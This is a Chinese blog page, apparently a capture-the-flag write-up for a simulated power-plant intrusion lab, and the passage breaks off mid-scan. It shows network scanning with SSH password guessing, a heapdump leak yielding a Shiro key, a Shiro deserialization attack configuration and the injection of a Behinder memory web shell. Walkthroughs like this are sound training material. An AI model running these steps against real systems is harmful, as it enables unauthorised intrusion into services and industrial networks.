@@ -1,0 +1,961 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 ThermalPower">
+<meta property="og:url" content="http://example.com/2026/test59/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215366.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215125.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215557.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215496.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215215.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215858.png">
+<meta property="article:published_time" content="2026-04-15T10:16:15.740Z">
+<meta property="article:modified_time" content="2026-04-15T14:15:52.824Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215767.png">
+  
+  
+  
+  <title>春秋云镜 ThermalPower - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜 ThermalPower"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜 ThermalPower</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p><em>靶标介绍：</em></p>
+<p>该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。 附件地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd=kj6h">https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd=kj6h</a></p>
+<blockquote>
+<p>这个靶场是2023工业信息安全技能大赛复赛火力发电场景的原题。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215767.png" srcset="/img/loading.gif" lazyload alt="20240313104229-5589178c-e0e3-1"></p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><blockquote>
+<p>评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。</p>
+</blockquote>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-symbol">./fscan</span> <span class="hljs-operator">-</span>h <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>            <br><br>   ___                              _    <br>  <span class="hljs-symbol">/</span> _ \     ___  ___ _ __ __ _  ___| | __ <br> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_\<span class="hljs-operator">/</span>____<span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> __| &#x27;__<span class="hljs-symbol">/</span> _` |<span class="hljs-symbol">/</span> __| |<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span><br><span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_\\_____\__ \ (__| | | (_| | (__|   <span class="hljs-operator">&lt;</span>    <br>\____<span class="hljs-symbol">/</span>     |___<span class="hljs-operator">/</span>\___|_|  \__,_|\___|_|\_\   <br>                     fscan <span class="hljs-params">version:</span> <span class="hljs-number">1.8</span>.<span class="hljs-number">4</span><br>start infoscan<br><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span> open<br><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> open<br>[<span class="hljs-operator">*</span>] alive ports len <span class="hljs-params">is:</span> <span class="hljs-number">2</span><br>start vulscan<br>[<span class="hljs-operator">*</span>] WebTitle http:<span class="hljs-operator">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span>  code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转<span class="hljs-params">url:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/login</span>;<span class="hljs-attr">jsessionid</span><span class="hljs-operator">=</span><span class="hljs-number">4</span>F6264CBFDEEEFB5B3BBFD5871672D8C<br>[<span class="hljs-operator">*</span>] WebTitle http:<span class="hljs-operator">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/login</span>;<span class="hljs-attr">jsessionid</span><span class="hljs-operator">=</span><span class="hljs-number">4</span>F6264CBFDEEEFB5B3BBFD5871672D8C code:<span class="hljs-number">200</span> len:<span class="hljs-number">2936</span>   title:火创能源监控画面管理平台<br>[<span class="hljs-operator">+</span>] PocScan http:<span class="hljs-operator">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span> poc-yaml-spring-actuator-heapdump-file <br>[<span class="hljs-operator">+</span>] PocScan http:<span class="hljs-operator">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span> poc-yaml-springboot-env-unauth spring2<br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> root root_123 <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> root <span class="hljs-number">1234567890</span> <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> root <span class="hljs-number">2</span>wsx@WSX <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> admin Admin@<span class="hljs-number">123</span> <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> admin a123456. <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">1</span><span class="hljs-symbol">/2</span> [-] ssh <span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">22</span> admin a123123 <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">2</span><span class="hljs-symbol">/2</span><br>[<span class="hljs-operator">*</span>] 扫描结束,耗时: <span class="hljs-number">7</span>m4.<span class="hljs-number">312747007</span>s<br></code></pre></td></tr></table></figure>
+
+<p>注意到RememberMe，猜测是shiro框架</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215914.png" srcset="/img/loading.gif" lazyload alt="image-20251023221821524"></p>
+<h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>典中典i春秋<code>heapdump</code>泄露，先下载 heapdump 内存泄漏文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.98</span>.<span class="hljs-number">127.19</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/actuator/</span>heapdump<br><br><span class="hljs-comment"># heapdump可能的路径如下</span><br>/heapdump<br><span class="hljs-regexp">/Actuator/</span>heapdump<br><span class="hljs-regexp">/actuator/</span>heapdump<br></code></pre></td></tr></table></figure>
+
+<p>然后提取信息，这里用内存泄露检测工具<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a>一把梭即可，</p>
+<p>结果中存在 Shiro key，尝试 Shiro 反序列化：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump<br><br>===========================================<br>CookieRememberMeManager(ShiroKey)<br>-------------<br>algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES<br><br>===========================================<br></code></pre></td></tr></table></figure>
+
+<p>找到构造链：</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">URL</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://121.89.201.231:8080</span><br><span class="hljs-attribute">SHIRO KEY</span><span class="hljs-punctuation">:</span> <span class="hljs-string">QZYysgMYhG6/CzIJlVpR2g==</span><br><span class="hljs-attribute">构造链（可以爆破一下构造链）</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CommonsBeanutils1 </span><br><span class="hljs-attribute">回显方式</span><span class="hljs-punctuation">:</span> <span class="hljs-string">AllEcho</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215366.png" srcset="/img/loading.gif" lazyload alt="image-20251023160305186"></p>
+<p>注入内存马：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">冰蝎[<span class="hljs-built_in">Filter</span>]  注入成功!<br>路径：http:<span class="hljs-comment">//39.98.127.19 :8080/matrix.ico</span><br>密码：cmd<br></code></pre></td></tr></table></figure>
+
+<p>连接内存马，得到 flag01</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215118.png" srcset="/img/loading.gif" lazyload alt="image-20251023160952731"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">cat flag01.txt<br>   ████  ██                    ████   ██ <br>  ░██░  ░██            █████  █░░░██ ███ <br> ██████ ░██  ██████   ██░░░██░█  █░█░░██ <br>░░░██░  ░██ ░░░░░░██ ░██  ░██░█ █ ░█ ░██ <br>  ░██   ░██  ███████ ░░██████░██  ░█ ░██ <br>  ░██   ░██ ██░░░░██  ░░░░░██░█   ░█ ░██ <br>  ░██   ███░░████████  █████ ░ ████  ████<br>  ░░   ░░░  ░░░░░░░░  ░░░░░   ░░░░  ░░░░ <br><br><br>flag01: flag&#123;<span class="hljs-number">81700400</span>-eecc-<span class="hljs-number">4895</span>-aa1e-<span class="hljs-number">042d</span><span class="hljs-number">7309a630</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><blockquote>
+<p>尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。</p>
+</blockquote>
+<p>fscan扫描</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">(remote) root@security:/matrix# ifconfig<br>eth0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>  broadcast <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span><br>        inet6 fe80::<span class="hljs-number">216</span>:3eff:fe38:8b17  prefixlen <span class="hljs-number">64</span>  scopeid 0x20&lt;link&gt;<br>        ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:3e:<span class="hljs-number">38</span>:8b:<span class="hljs-number">17</span>  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)<br>        RX packets <span class="hljs-number">1237105</span>  bytes <span class="hljs-number">870689334</span> (<span class="hljs-number">870</span>.<span class="hljs-number">6</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">928024</span>  bytes <span class="hljs-number">806943200</span> (<span class="hljs-number">806</span>.<span class="hljs-number">9</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>lo: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span><br>        inet <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>        inet6 ::<span class="hljs-number">1</span>  prefixlen <span class="hljs-number">128</span>  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        RX packets <span class="hljs-number">89326</span>  bytes <span class="hljs-number">39004677</span> (<span class="hljs-number">39</span>.<span class="hljs-number">0</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">89326</span>  bytes <span class="hljs-number">39004677</span> (<span class="hljs-number">39</span>.<span class="hljs-number">0</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br>./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>/<span class="hljs-number">24</span><br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>   is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">2</span><br><span class="hljs-number">172.22.17.213:8181</span> open<br><span class="hljs-number">172.22.17.6:445</span> open<br><span class="hljs-number">172.22.17.6:139</span> open<br><span class="hljs-number">172.22.17.6:135</span> open<br><span class="hljs-number">172.22.17.6:80</span> open<br><span class="hljs-number">172.22.17.6:21</span> open<br><span class="hljs-number">172.22.17.213:22</span> open<br><span class="hljs-number">172.22.17.213:8080</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">8</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>     WORKGROUP\WIN-ENGINEER        <br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span><br>   